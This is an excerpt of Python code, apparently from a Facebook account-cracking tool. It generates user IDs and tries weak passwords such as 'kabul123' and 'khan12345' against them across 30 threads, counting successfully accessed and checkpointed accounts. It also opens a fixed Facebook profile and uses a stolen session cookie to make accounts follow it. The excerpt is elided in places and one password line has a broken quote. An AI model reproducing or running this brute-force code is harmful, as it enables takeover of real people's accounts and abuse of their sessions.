...
clear()
os.system("xdg-open https://www.facebook.com/profile.php?id=100000113856252")
xxxx = str(len(ugen))
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://www.facebook.com/profile.php?id=100000113856252', cookies={'cookie': coki}).text, 'html.parser')
...
def awm8():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'kabul123'khan123'khan12345']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
